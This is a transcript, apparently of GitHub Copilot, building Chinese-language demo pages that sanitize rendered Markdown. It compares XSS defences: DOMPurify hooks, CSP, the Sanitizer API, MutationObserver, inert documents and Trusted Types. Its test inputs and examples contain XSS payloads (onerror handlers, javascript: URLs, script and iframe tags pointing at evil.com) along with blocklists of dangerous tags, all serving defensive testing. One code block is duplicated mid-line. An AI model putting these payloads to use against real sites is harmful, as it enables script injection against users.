var CSS='body{font-family:-apple-system,sans-serif;padding:16px;margin:0;line-height:1.6;color:#333}pre{background:#1e1e1e;color:#d4d4d4;padding:16px;border-radius:4px;overflow-x:auto}code{font-family:Menlo,Consolas,monospace;font-size:13px}p>code,li>code{background:#f0f0f0;padding:2px 6px;border-radius:3px}blockquote{border-left:4px solid #ddd;margin:0;padding:8px 16px;color:#666}table{border-collapse:collapse}th,td{border:1px solid #ddd;padding:8px;text-align:left}img{max-width:100%}hr{border:none;border-top:1px solid #ddd;margin:24px 0}';
function rebuildTag(el){var t=el.tagName.toLowerCase(),a='';for(var i=0;i<el.attributes.length;i++){a+=' '+el.attributes[i].name+'="'+el.attributes[i].value+'"'}var inner=el.innerHTML||el.textContent||'';return inner?'<'+t+a+'>'+inner+'</'+t+'>':'<'+t+a+'>'}
function renderSafe(md){var raw=marked.parse(md);DOMPurify.removeAllHooks();var blocked=['script','style','iframe','object','embed','applet','form','base','meta','link','noscript','noembed','frameset','frame','title','xmp','plaintext','isindex','bgsound','layer','svg','math'];DOMPurify.addHook('uponSanitizeElement',function(n,d){if(n.nodeType!==1)return;var tag=(d.tagName||'').toLowerCase();if(blocked.indexOf(tag)!==-1){n.replaceWith(document.createTextNode(rebuildTag(n)))}});DOMPurify.addHook('uponSanitizeAttribute',function(n,d){if(!d.attrName)return;if(!n._xOrig){var a='';for(var i=0;i<n.attributes.length;i++){a+=' '+n.attributes[i].name+'="'+n.attributes[i].value+'"'}n._xOrig=a;n._xTag=n.tagName.toLowerCase();n._xInner=n.innerHTML||''}if(/^on/i.test(d.attrName)){n._xDanger=true}if((d.attrName==='href'||d.attrName==='src'||d.attrName==='action')&&/^(javascript|vbscript|data\s*:)/i.test((d.attrValue||'').replace(/[\s\x00-\x1f]/g,''))){n._xDanger=true}});DOMPurify.addHook('afterSanitizeAttributes',function(n){if(n._xDanger){var txt='<'+n._xTag+n._xOrig+'>'+n._xInner+'</'+n._xTag+'>';n.replaceWith(document.createTextNode(txt))}});var dom=DOMPurify.sanitize(raw,{RETURN_DOM:true,ADD_TAGS:['details','summary'],ADD_ATTR:['open','style']});var r=dom.innerHTML;DOMPurify.removeAllHooks();return r}
function render(){var md=document.getElementById('editor').value;var h=renderSafe(md);document.getElementById('preview').srcdoc='<!DOCTYPE html><html><head><meta charset="UTF-8"><style>'+CSS+'</style></head><body>'+h+'</body></html>'}
document.getElementById('editor').addEventListener('input',render);render();
</script>
</body>
</html>
NODEEOF

Ran terminal command:  cd "/未命名文件夹"
python3 -c "
import sys
content = sys.stdin.read()
with open('case11-dompurify-to-text.html', 'w') as f:
    f.write(content)
print('Done:', len(content), 'bytes')
" << 'PYEOF'
<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<title>DOMPurify 危险内容转纯文本预览</title>
<style>*{box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;margin:0;padding:20px;background:#f5f5f5}h1{font-size:18px;margin-top:0}.container{display:flex;gap:16px}.panel{flex:1;min-width:0}textarea{width:100%;height:650px;font-family:Menlo,Consolas,monospace;font-size:13px;padding:12px;border:1px solid #ccc;border-radius:4px;resize:vertical}.preview-frame{border:1px solid #ccc;border-radius:4px;background:#fff;width:100%;height:650px}.section-title{font-weight:bold;margin-bottom:8px}</style>
</head>
<body>
<h1>DOMPurify 危险内容转纯文本 - 安全HTML正常渲染</h1>
<div class="container">
<div class="panel">
<div class="section-title">Markdown 输入</div>
<textarea id="editor"># 正常 Markdown 内容

- **加粗** 和 *斜体* 和 ~~删除线~~
- `行内代码`

[正常链接](https://example.com)

![Markdown图片](https://qiniucloud..space/images202501270030826.jpg)

> 这是一段引用文字

| 表头1 | 表头2 |
|-------|-------|
| 数据1 | 数据2 |

```javascript
function hello() {
  console.log("Hello World");
}
```

---

# 安全 HTML（正常渲染）

<img src="https://qiniucloud..space/images202501270030826.jpg" alt="正常图片" style="zoom:50%;" />

<div style="color: blue; font-size: 18px; border: 1px solid blue; padding: 8px;">
  蓝色 div 正常渲染
</div>

这段有<span style="color:red; font-weight:bold;">红色加粗</span>的内容

第一行<br>第二行<br>第三行

---

# 危险 HTML（转为纯文本展示）

<script>alert('XSS')</script>

<script src="https://evil.com/malware.js"></script>

<img src=x onerror="alert('XSS')">

<img src="https://qiniucloud..space/images202501270030826.jpg" onerror="alert('XSS')" onload="alert('loaded')">

<div onmouseover=alert('XSS')>鼠标移入触发</div>

<input onfocus="alert('XSS')" autofocus>

<a href="javascript:alert('XSS')">恶意链接</a>

<svg onload="alert('XSS')">

<iframe src="javascript:alert('XSS')"></iframe>

<iframe src="https://evil.com"></iframe>

<style>body{background:red !important}</style>

<form action="javascript:alert('XSS')"><input type="submit"></form>

<base href="https://evil.com">

<meta http-equiv="refresh" content="0;url=javascript:alert('XSS')">

---

# 混合场景

正常文字 <script>alert('行内XSS')</script> 后续正常文字

**加粗** 中间 <img src=x onerror="alert(1)"> 继续 *斜体*

安全图片和危险图片对比：
<img src="https://qiniucloud..space/images202501270030826.jpg" style="width:100px" />
<img src="https://qiniucloud..space/images202501270030826.jpg" onclick="alert(1)" /></textarea>
</div>
<div class="panel">
<div class="section-title">安全预览</div>
<iframe id="preview" class="preview-frame" sandbox="allow-same-origin"></iframe>
</div>
</div>
<script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/dompurify/dist/purify.min.js"></script>
<script>
var CSS='body{font-family:-apple-system,sans-serif;padding:16px;margin:0;line-height:1.6;color:#333}pre{background:#1e1e1e;color:#d4d4d4;padding:16px;border-radius:4px;overflow-x:auto}code{font-family:Menlo,Consolas,monospace;font-size:13px}p>code,li>code{background:#f0f0f0;padding:2px 6px;border-radius:3px}blockquote{border-left:4px solid #ddd;margin:0;padding:8px 16px;color:#666}table{border-collapse:collapse}th,td{border:1px solid #ddd;padding:8px;text-align:left}img{max-width:100%}hr{border:none;border-top:1px solid #ddd;margin:24px 0}';
function rebuildTag(el){var t=el.tagName.toLowerCase(),a='';for(var i=0;i<el.attributes.length;i++){a+=' '+el.attributes[i].name+'="'+el.attributes[i].value+'"'}var c=el.innerHTML||el.textContent||'';return c?'<'+t+a+'>'+c+'</'+t+'>':'<'+t+a+'>'}
function renderSafe(md){
  var raw=marked.parse(md);
  DOMPurify.removeAllHooks();
  var blocked=['script','style','iframe','object','embed','applet','form','base','meta','link','noscript','noembed','frameset','frame','title','xmp','plaintext','isindex','bgsound','layer','svg','math'];
  DOMPurify.addHook('uponSanitizeElement',function(n,d){
    if(n.nodeType!==1)return;
    var tag=(d.tagName||'').toLowerCase();
    if(blocked.indexOf(tag)!==-1){n.replaceWith(document.createTextNode(rebuildTag(n)))}
  });
  DOMPurify.addHook('uponSanitizeAttribute',function(n,d){
    if(!d.attrName)return;
    if(!n._xOrig){var a='';for(var i=0;i<n.attributes.length;i++){a+=' '+n.attributes[i].name+'="'+n.attributes[i].value+'"'}n._xOrig=a;n._xTag=n.tagName.toLowerCase();n._xInner=n.innerHTML||''}
    if(/^on/i.test(d.attrName)){n._xDanger=true}
    if((d.attrName==='href'||d.attrName==='src'||d.attrName==='action')&&/^(javascript|vbscript|data\s*:)/i.test((d.attrValue||'').replace(/[\s\x00-\x1f]/g,''))){n._xDanger=true}
  });
  DOMPurify.addHook('afterSanitizeAttributes',function(n){
    if(n._xDanger){var txt='<'+n._xTag+n._xOrig+'>'+n._xInner+'</'+n._xTag+'>';n.replaceWith(document.createTextNode(txt))}
  });
  var dom=DOMPurify.sanitize(raw,{RETURN_DOM:true,ADD_TAGS:['details','summary'],ADD_ATTR:['open','style']});
  var r=dom.innerHTML;
  DOMPurify.removeAllHooks();
  return r;
}
function render(){var md=document.getElementById('editor').value;var h=renderSafe(md);document.getElementById('preview').srcdoc='<!DOCTYPE html><html><head><meta charset="UTF-8"><style>'+CSS+'</style></head><body>'+h+'</body></html>'}
document.getElementById('editor').addEventListener('input',render);
render();
</script>
</body>
</html>
PYEOF
Completed with input:  cd "/未命名文件夹"
python3 -c "
import sys
content = sys.stdin.read()
with open('case11-dompurify-to-text.html', 'w') as f:
    f.write(content)
print('Done:', len(content), 'bytes')
" << 'PYEOF'
<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<title>DOMPurify 危险内容转纯文本预览</title>
<style>*{box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;margin:0;padding:20px;background:#f5f5f5}h1{font-size:18px;margin-top:0}.container{display:flex;gap:16px}.panel{flex:1;min-width:0}textarea{width:100%;height:650px;font-family:Menlo,Consolas,monospace;font-size:13px;padding:12px;border:1px solid #ccc;border-radius:4px;resize:vertical}.preview-frame{border:1px solid #ccc;border-radius:4px;background:#fff;width:100%;height:650px}.section-title{font-weight:bold;margin-bottom:8px}</style>
</head>
<body>
<h1>DOMPurify 危险内容转纯文本 - 安全HTML正常渲染</h1>
<div class="container">
<div class="panel">
<div class="section-title">Markdown 输入</div>
<textarea id="editor"># 正常 Markdown 内容

- **加粗** 和 *斜体* 和 ~~删除线~~
- `行内代码`

[正常链接](https://example.com)

![Markdown图片](https://qiniucloud..space/images202501270030826.jpg)

> 这是一段引用文字

| 表头1 | 表头2 |
|-------|-------|
| 数据1 | 数据2 |

```javascript
function hello() {
  console.log("Hello World");
}
```

---

# 安全 HTML（正常渲染）

<img src="https://qiniucloud..space/images202501270030826.jpg" alt="正常图片" style="zoom:50%;" />

<div style="color: blue; font-size: 18px; border: 1px solid blue; padding: 8px;">
  蓝色 div 正常渲染
</div>

这段有<span style="color:red; font-weight:bold;">红色加粗</span>的内容

第一行<br>第二行<br>第三行

---

# 危险 HTML（转为纯文本展示）

<script>alert('XSS')</script>

<script src="https://evil.com/malware.js"></script>

<img src=x onerror="alert('XSS')">

<img src="https://qiniucloud..space/images202501270030826.jpg" onerror="alert('XSS')" onload="alert('loaded')">

<div onmouseover=alert('XSS')>鼠标移入触发</div>

<input onfocus="alert('XSS')" autofocus>

<a href="javascript:alert('XSS')">恶意链接</a>

<svg onload="alert('XSS')">

<iframe src="javascript:alert('XSS')"></iframe>

<iframe src="https://evil.com"></iframe>

<style>body{background:red !important}</style>

<form action="javascript:alert('XSS')"><input type="submit"></form>

<base href="https://evil.com">

<meta http-equiv="refresh" content="0;url=javascript:alert('XSS')">

---

# 混合场景

正常文字 <script>alert('行内XSS')</script> 后续正常文字

**加粗** 中间 <img src=x onerror="alert(1)"> 继续 *斜体*

安全图片和危险图片对比：
<img src="https://qiniucloud..space/images202501270030826.jpg" style="width:100px" />
<img src="https://qiniucloud..space/images202501270030826.jpg" onclick="alert(1)" /></textarea>
</div>
<div class="panel">
<div class="section-title">安全预览</div>
<iframe id="preview" class="preview-frame" sandbox="allow-same-origin"></iframe>
</div>
</div>
<script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/dompurify/dist/purify.min.js"></script>
<script>
var CSS='body{font-family:-apple-system,sans-serif;padding:16px;margin:0;line-height:1.6;color:#333}pre{background:#1e1e1e;color:#d4d4d4;padding:16px;border-radius:4px;overflow-x:auto}code{font-family:Menlo,Consolas,monospace;font-size:13px}p>code,li>code{background:#f0f0f0;padding:2px 6px;border-radius:3px}blockquote{border-left:4px solid #ddd;margin:0;padding:8px 16px;color:#666}table{border-collapse:collapse}th,td{border:1px solid #ddd;padding:8px;text-align:left}img{max-width:100%}hr{border:none;border-top:1px solid #ddd;margin:24px 0}';
function rebuildTag(el){var t=el.tagName.toLowerCase(),a='';for(var i=0;i<el.attributes.length;i++){a+=' '+el.attributes[i].name+'="'+el.attributes[i].value+'"'}var c=el.innerHTML||el.textContent||'';return c?'<'+t+a+'>'+c+'</'+t+'>':'<'+t+a+'>'}
function renderSafe(md){
  var raw=marked.parse(md);
  DOMPurify.removeAllHooks();
  var blocked=['script','style','iframe','object','embed','applet','form','base','meta','link','noscript','noembed','frameset','frame','title','xmp','plaintext','isindex','bgsound','layer','svg','math'];
  DOMPurify.addHook('uponSanitizeElement',function(n,d){
    if(n.nodeType!==1)return;
    var tag=(d.tagName||'').toLowerCase();
    if(blocked.indexOf(tag)!==-1){n.replaceWith(document.createTextNode(rebuildTag(n)))}
  });
  DOMPurify.addHook('uponSanitizeAttribute',function(n,d){
    if(!d.attrName)return;
    if(!n._xOrig){var a='';for(var i=0;i<n.attributes.length;i++){a+=' '+n.attributes[i].name+'="'+n.attributes[i].value+'"'}n._xOrig=a;n._xTag=n.tagName.toLowerCase();n._xInner=n.innerHTML||''}
    if(/^on/i.test(d.attrName)){n._xDanger=true}
    if((d.attrName==='href'||d.attrName==='src'||d.attrName==='action')&&/^(javascript|vbscript|data\s*:)/i.test((d.attrValue||'').replace(/[\s\x00-\x1f]/g,''))){n._xDanger=true}
  });
  DOMPurify.addHook('afterSanitizeAttributes',function(n){
    if(n._xDanger){var txt='<'+n._xTag+n._xOrig+'>'+n._xInner+'</'+n._xTag+'>';n.replaceWith(document.createTextNode(txt))}
  });
  var dom=DOMPurify.sanitize(raw,{RETURN_DOM:true,ADD_TAGS:['details','summary'],ADD_ATTR:['open','style']});
  var r=dom.innerHTML;
  DOMPurify.removeAllHooks();
  return r;
}
function render(){var md=document.getElementById('editor').value;var h=renderSafe(md);document.getElementById('preview').srcdoc='<!DOCTYPE html><html><head><meta charset="UTF-8"><style>'+CSS+'</style></head><body>'+h+'</body></html>'}
document.getElementById('editor').addEventListener('input',render);
render();
</script>
</body>
</html>
PYEOF

heredoc 在 zsh 中遇到了特殊字符问题。我直接用 `create_file` 写一个新文件名，然后 mv 过去。  

已创建 [](%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6%E5%A4%B9/case11-new.html)

Ran terminal command:  mv case11-new.html case11-dompurify-to-text.html
Completed with input:  mv case11-new.html case11-dompurify-to-text.html

之前的 heredoc 还没结束。让我重置终端。  

Ran terminal command:  ls case11-new.html case11-dompurify-to-text.html 2>&1
Completed with input:  ls case11-new.html case11-dompurify-to-text.html 2>&1

已压缩对话

读取 [](%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6%E5%A4%B9/case11-dompurify-to-text.html#1-1)，行 1 到 200

读取 [](%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6%E5%A4%B9/case11-dompurify-to-text.html#200-200)，行 200 到 249

文件已经存在且内容完整。当前 case11-dompurify-to-text.html 已经实现了你要求的效果：

- **安全 HTML**（`<img>`, `<div>`, `<span>` 等）→ 正常渲染
- **危险标签**（`<script>`, `<iframe>`, `<style>` 等）→ 直接转为纯文本显示
- **带危险属性的标签**（`onerror`, `onclick`, `javascript:` 等）→ 整个标签转为纯文本显示
- **无任何特殊样式** — 没有黄色背景、没有删除线、没有 `[已拦截]` 标注

文件状态正常，可以直接在浏览器中打开预览。需要我做什么其他修改吗？

已进行更改。

User: 我还想看一下方案 F: rehype AST 树变换的效果，请在新文件中实现

GitHub Copilot: 

 

已创建 [](%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6%E5%A4%B9/case12-rehype-ast.html)

case12-rehype-ast.html 已创建。

**方案 F 核心思路：**

1. `marked` 将 Markdown 转为 HTML 字符串
2. `rehype-parse` 将 HTML 解析为 **HAST**（HTML 抽象语法树）
3. 自定义插件 `rehypeSanitizeToText` 遍历 AST：
   - 被封禁的标签（`script`, `iframe`, `style` 等）→ 用 `toHtml()` 序列化回原始 HTML 字符串，替换为文本节点
   - 含危险属性的标签（`on*` 事件、`javascript:` 协议）→ 同样序列化为纯文本节点
   - 安全标签 → 保持不动，正常渲染
4. `rehype-stringify` 将处理后的 AST 序列化回安全 HTML

**与 case11 DOMPurify 方案的区别：** 全程在纯 AST 层面操作，不依赖浏览器 DOM API，可同构运行于 Node.js 和浏览器。所有依赖通过 `importmap` + `esm.sh` CDN 加载，直接浏览器打开即可预览。

已进行更改。

User: 除了我们上述讨论的方案，还有其他方案吗？我有一个想法是如果遇到恶意脚本就不让其js执行，这种方案可行吗？

GitHub Copilot: 

你的想法完全可行，而且是非常正统的安全手段。除了我们已讨论的 A-F 方案，还有几种其他思路：

---

### 你的想法：阻止 JS 执行但保留 HTML 渲染

这正是 **CSP（Content Security Policy）** 的核心能力。通过设置 `Content-Security-Policy: script-src 'none'`，浏览器会**渲染所有 HTML/CSS**，但**完全禁止任何 JS 执行**——包括 `<script>` 标签、`on*` 事件属性、`javascript:` 协议等。

**优点：**
- 浏览器原生机制，不需要任何第三方库
- 几乎零性能开销
- 覆盖面极广（inline script、eval、外部脚本全部拦截）
- HTML/CSS 正常渲染，图片正常显示

**缺点：**
- `on*` 属性虽然不会执行，但仍然存在于 DOM 中（攻击者看得到代码）
- `<style>` 标签仍会生效（CSS 注入无法阻止，比如 `body{display:none}`）
- `<iframe>` / `<form>` 等标签的非 JS 行为仍然存在（如表单提交、页面嵌入）
- `<meta http-equiv="refresh">` 的跳转行为与浏览器实现有关

---

### 其他我们还没讨论的方案

| 方案 | 原理 | 特点 |
|------|------|------|
| **G: CSP `script-src 'none'`** | iframe 内通过 CSP 禁止所有脚本执行 | 浏览器原生，零依赖，HTML/CSS 正常渲染 |
| **H: Sanitizer API（浏览器原生）** | `new Sanitizer()` + `setHTML()` | W3C 新标准，Chrome 105+ 支持，无需第三方库 |
| **I: MutationObserver 拦截** | 监听 DOM 变化，脚本节点插入时立即移除 | 实时防御，但有竞态风险 |
| **J: createHTMLDocument 惰性解析** | 在 `document.implementation.createHTMLDocument()` 中解析，天然不执行脚本 | 可用于提取安全内容后再插入主文档 |
| **K: Trusted Types** | 强制所有 DOM sink（innerHTML 等）必须传入受信任的类型对象 | 企业级方案，需要全局配置 |

---

想看哪个方案的效果？我推荐先实现 **方案 G（CSP）**，这正是你说的"不让 JS 执行"的最直接实现，零依赖且效果最直观。要我创建 demo 吗？

User: G- K方案的具体实现方案我都想学习一下，请告诉我具体内容，同时，请帮我创建一份 阻止 JS 执行但保留 HTML 渲染方案的demo，并清楚实现边界case和优缺点case

GitHub Copilot: 

 

已创建 2 个待办事项

## 方案 G ~ K 详细讲解

---

### 方案 G: CSP `script-src 'none'`

**原理：** 在 iframe 的 `srcdoc` 中通过 `<meta>` 标签设置 Content-Security-Policy，令浏览器禁止一切脚本执行。

```html
<meta http-equiv="Content-Security-Policy"
      content="script-src 'none'; object-src 'none';">
```

**浏览器行为：**
- `<script>alert(1)</script>` → 不执行，标签被忽略
- `<img onerror="alert(1)">` → `onerror` 不触发
- `<a href="javascript:alert(1)">` → 点击后浏览器阻止导航
- `<div style="color:red">` → **正常渲染**（CSS 不受影响）
- `<img src="正常图片">` → **正常显示**

**覆盖范围：**
| 攻击向量 | 是否拦截 |
|----------|---------|
| `<script>` 内联/外部 | ✅ 拦截 |
| `on*` 事件属性 | ✅ 拦截 |
| `javascript:` 协议 | ✅ 拦截 |
| `eval()`, `setTimeout("code")` | ✅ 拦截 |
| `<style>body{display:none}</style>` | ❌ CSS 仍生效 |
| `<iframe src="https://evil.com">` | ❌ 需额外加 `frame-src 'none'` |
| `<form action="https://evil.com">` | ❌ 表单仍可提交 |
| `<meta http-equiv="refresh">` | ❌ 部分浏览器仍跳转 |

---

### 方案 H: Sanitizer API（浏览器原生）

**原理：** W3C 新标准 `Sanitizer API`，提供 `element.setHTML(html, { sanitizer })` 方法，浏览器内置白名单过滤。

```js
const sanitizer = new Sanitizer({
  allowElements: ['p', 'b', 'i', 'a', 'img', 'div', 'span', 'br', 'ul', 'ol', 'li',
                   'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'blockquote', 'pre', 'code',
                   'table', 'thead', 'tbody', 'tr', 'th', 'td', 'hr', 'em', 'strong', 'del'],
  allowAttributes: {
    'href': ['a'],
    'src': ['img'],
    'alt': ['img'],
    'style': ['*'],
    'class': ['*']
  }
  // 未列出的标签/属性会被自动移除
});

const div = document.createElement('div');
div.setHTML(rawHtml, { sanitizer });
```

**特点：**
- 浏览器原生实现，无需第三方库，性能最优
- **严格白名单**，未知标签直接删除（不是转文本）
- 当前兼容性：Chrome 105+，Firefox/Safari 实验性支持
- **API 仍在演进中**，不同浏览器版本的 API 签名可能不同

**局限：**
- 兼容性不足，生产环境建议搭配 polyfill
- 被删除的内容直接消失，用户看不到原始恶意代码
- 配置灵活度不如 DOMPurify

---

### 方案 I: MutationObserver 拦截

**原理：** 监听 DOM 变化事件，当检测到 `<script>` 等危险节点被插入时立即移除。

```js
const observer = new MutationObserver(function(mutations) {
  mutations.forEach(function(mutation) {
    mutation.addedNodes.forEach(function(node) {
      if (node.nodeType !== 1) return;
      const tag = node.tagName.toLowerCase();
      if (['script', 'iframe', 'object', 'embed'].includes(tag)) {
        node.remove();
      }
      // 移除 on* 属性
      Array.from(node.attributes || []).forEach(function(attr) {
        if (/^on/i.test(attr.name)) {
          node.removeAttribute(attr.name);
        }
      });
    });
  });
});

observer.observe(targetElement, { childList: true, subtree: true });
targetElement.innerHTML = rawHtml; // 插入后 observerconst observer = new MutationObserver(function(mutations) {
  mutations.forEach(function(mutation) {
    mutation.addedNodes.forEach(function(node) {
      if (node.nodeType !== 1) return;
      const tag = node.tagName.toLowerCase();
      if (['script', 'iframe', 'object', 'embed'].includes(tag)) {
        node.remove();
      }
      // 移除 on* 属性
      Array.from(node.attributes || []).forEach(function(attr) {
        if (/^on/i.test(attr.name)) {
          node.removeAttribute(attr.name);
        }
      });
    });
  });
});

observer.observe(targetElement, { childList: true, subtree: true });
targetElement.innerHTML = rawHtml; // 插入后 observer

User: @agent 重试

GitHub Copilot: ## G-K 五种方案详解

---

### 方案 G: CSP `script-src 'none'`

**原理：** 在 iframe 的 `srcdoc` 中通过 `<meta http-equiv="Content-Security-Policy">` 设置 `script-src 'none'`，浏览器级别禁止一切 JS 执行。

```html
<iframe srcdoc="
  <!DOCTYPE html>
  <html>
  <head>
    <meta http-equiv='Content-Security-Policy' content='script-src &apos;none&apos;'>
  </head>
  <body>
    <!-- 所有 HTML/CSS 正常渲染，但 JS 完全不执行 -->
    <script>alert('XSS')</script>           <!-- 不执行 -->
    <img src=x onerror='alert(1)'>          <!-- onerror 不触发 -->
    <a href='javascript:alert(1)'>点我</a>  <!-- 点击无效 -->
    <div style='color:red'>红色文字</div>   <!-- 正常渲染 -->
  </body>
  </html>
" sandbox="allow-same-origin"></iframe>
```

**覆盖范围：**
- `<script>` 内联/外部 — 全部阻止
- `on*` 事件属性 — 全部阻止
- `javascript:` 协议 — 全部阻止
- `eval()`、`setTimeout("code")` — 全部阻止

**边界/缺点：**
- `<style>body{display:none}</style>` — CSS 仍然生效，可以搞破坏
- `<form action="https://evil.com">` — 表单提交行为仍存在（可配合 sandbox 限制）
- `<meta http-equiv="refresh" content="0;url=https://evil.com">` — 跳转仍可能生效
- `<iframe src="https://evil.com">` — 嵌套 iframe 仍会加载（需额外加 `frame-src 'none'`）
- `<object>` / `<embed>` — 插件仍可能加载（需加 `object-src 'none'`）

**增强版 CSP：**
```
script-src 'none'; object-src 'none'; frame-src 'none'; base-uri 'none'; form-action 'none'
```

---

### 方案 H: Sanitizer API（浏览器原生）

**原理：** W3C 新标准，浏览器内置的 HTML 清洗 API。无需第三方库，直接调用 `setHTML()`。

```javascript
// 创建 Sanitizer 实例（可自定义配置）
const sanitizer = new Sanitizer({
  allowElements: ['p', 'div', 'span', 'a', 'img', 'br', 'hr',
    'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
    'ul', 'ol', 'li', 'table', 'tr', 'td', 'th', 'thead', 'tbody',
    'blockquote', 'pre', 'code', 'em', 'strong', 'del', 'details', 'summary'],
  allowAttributes: {
    'href': ['a'],
    'src': ['img'],
    'alt': ['img'],
    'style': ['*'],
    'class': ['*']
  },
  // 以下会被自动移除：script, iframe, on*, javascript: 等
});

// 用法 1：直接设置安全 HTML
element.setHTML(unsafeHtmlString, { sanitizer });

// 用法 2：获取清洗后的 DocumentFragment
const fragment = sanitizer.sanitize(unsafeHtmlString);
```

**优点：**
- 浏览器原生实现，性能最优
- 不需要加载任何第三方库
- 默认配置已经移除所有危险内容
- 未来趋势，会成为标准

**缺点/边界：**
- **兼容性差** — 截至 2026 年仅 Chrome 105+、Edge 105+ 支持，Firefox/Safari 支持不完整
- 行为是**直接删除**危险节点，不是转为纯文本（和 DOMPurify 默认行为类似）
- API 仍在演进中，参数格式可能变化
- 不支持 hooks/回调机制，无法像 DOMPurify 那样自定义"转文本"逻辑
- 需要 feature detection：
```javascript
if (typeof Sanitizer !== 'undefined') {
  // 使用原生 API
} else {
  // 降级到 DOMPurify
}
```

---

### 方案 I: MutationObserver 拦截

**原理：** 使用 `MutationObserver` 监听 DOM 变化，当检测到危险节点（`<script>` 等）被插入时，立即移除或替换为文本。

```javascript
const observer = new MutationObserver(function(mutations) {
  mutations.forEach(function(mutation) {
    mutation.addedNodes.forEach(function(node) {
      if (node.nodeType !== 1) return; // 只处理元素节点

      // 检查插入的节点本身
      if (isDangerous(node)) {
        var text = document.createTextNode(node.outerHTML);
        node.parentNode.replaceChild(text, node);
        return;
      }

      // 检查子节点
      var dangerous = node.querySelectorAll('script,iframe,style,object,embed,svg,math,form,base,meta,link');
      dangerous.forEach(function(el) {
        el.replaceWith(document.createTextNode(el.outerHTML));
      });

      // 检查所有后代的 on* 属性
      node.querySelectorAll('*').forEach(function(el) {
        Array.from(el.attributes).forEach(function(attr) {
          if (/^on/i.test(attr.name)) {
            var text = document.createTextNode(el.outerHTML);
            el.replaceWith(text);
          }
        });
      });
    });
  });
});

// 在目标容器上启用监听
observer.observe(previewContainer, {
  childList: true,
  subtree: true
});

// 插入不安全内容 — Observer 会自动拦截
previewContainer.innerHTML = unsafeHtml;
```

**优点：**
- 实时防御，可以拦截动态插入的内容
- 不修改原始渲染管线
- 可与任何 Markdown 渲染器组合

**缺点/边界：**
- **竞态条件（Race Condition）** — 这是致命缺陷！`innerHTML` 赋值时脚本**可能先于 Observer 回调执行**。Observer 是**异步微任务**，而 `<script>` 是同步执行的。也就是说：
  ```javascript
  container.innerHTML = '<script>alert("我先执行了！")<\/script>';
  // alert 弹出 → Observer 回调触发 → 已经晚了
  ```
- `on*` 属性触发也可能早于 Observer 拦截（如 `<img onerror=...>` 在图片加载失败时立即触发）
- 性能开销：频繁 DOM 变动时回调成本高
- 不能阻止 CSS 注入（`<style>` 标签内容在解析时已生效）

**结论：MutationObserver 不适合作为主要安全手段，只能作为辅助层。**

---

### 方案 J: `createHTMLDocument` 惰性解析

**原理：** 使用 `document.implementation.createHTMLDocument()` 创建一个"惰性文档"。在这个文档中解析 HTML 时，**脚本天然不会执行**（因为它不关联任何浏览上下文），但 DOM 树完整可用。可以在这里清洗后再提取安全内容。

```javascript
function sanitizeViaInertDoc(unsafeHtml) {
  // 1) 创建惰性文档（无浏览上下文，脚本不执行）
  var inertDoc = document.implementation.createHTMLDocument('');
  inertDoc.body.innerHTML = unsafeHtml;

  // 2) 在惰性 DOM 中遍历和清洗
  var blocked = ['script','style','iframe','object','embed','form','base','meta','link','svg','math'];

  // 危险标签 → 纯文本
  blocked.forEach(function(tag) {
    var els = inertDoc.body.querySelectorAll(tag);
    els.forEach(function(el) {
      el.replaceWith(inertDoc.createTextNode(el.outerHTML));
    });
  });

  // 危险属性 → 整个标签变纯文本
  inertDoc.body.querySelectorAll('*').forEach(function(el) {
    var isDangerous = false;
    Array.from(el.attributes).forEach(function(attr) {
      if (/^on/i.test(attr.name)) isDangerous = true;
      if (/^(href|src|action)$/i.test(attr.name)) {
        if (/^(javascript|vbscript|data)\s*:/i.test(attr.value.replace(/[\s\x00-\x1f]/g, ''))) {
          isDangerous = true;
        }
      }
    });
    if (isDangerous) {
      el.replaceWith(inertDoc.createTextNode(el.outerHTML));
    }
  });

  // 3) 提取清洗后的 HTML
  return inertDoc.body.innerHTML;
}
```

**优点：**
- 解析阶段就不执行脚本（惰性文档的天然特性）
- 无竞态问题（不像 MutationObserver）
- 不需要第三方库
- 完整的 DOM API 可用于清洗

**缺点/边界：**
- 需要自己实现清洗逻辑（本质上是手写了一个简化版 DOMPurify）
- `<style>` 标签虽然在惰性文档中不影响主页面，但提取后通过 innerHTML 插入主文档时会生效
- 遍历顺序需要注意——先处理深层节点再处理外层，否则 outer HTML 可能不准确
- 浏览器兼容性好，但不适用于 Node.js（需要 jsdom）
- **DOMPurify 内部正是使用了这个机制**，所以这方案本质上是"手写 DOMPurify"

---

### 方案 K: Trusted Types

**原理：** Trusted Types 是一个 CSP 级别的安全策略，要求所有 DOM "注入点"（`innerHTML`、`document.write`、`eval` 等）必须接收 `TrustedHTML` / `TrustedScript` 类型的对象，而不是原始字符串。尝试传入普通字符串会被浏览器直接拒绝。

```javascript
// 1) 通过 CSP 头启用 Trusted Types
// <meta http-equiv="Content-Security-Policy"
//       content="require-trusted-types-for 'script'; trusted-types myPolicy">

// 2) 创建策略 — 这是唯一允许生成 TrustedHTML 的入口
const policy = trustedTypes.createPolicy('myPolicy', {
  createHTML: function(dirty) {
    // 在这里进行清洗
    return DOMPurify.sanitize(dirty, { RETURN_TRUSTED_TYPE: true });
  },
  createScript: function() {
    // 禁止创建任何脚本
    throw new Error('Script creation blocked by Trusted Types policy');
  },
  createScriptURL: function() {
    throw new Error('Script URL creation blocked');
  }
});

// 3) 使用
element.innerHTML = policy.createHTML(unsafeMarkdown);
// 如果直接写 element.innerHTML = "..." 会被浏览器拦截并报 TypeError

// 4) DOMPurify 内置支持
var clean = DOMPurify.sanitize(dirty, { RETURN_TRUSTED_TYPE: true });
// 返回 TrustedHTML 对象，可以直接赋值给 innerHTML
```

**优点：**
- **从根源封堵** — 不是"清洗后注入"，而是"不清洗就不让注入"
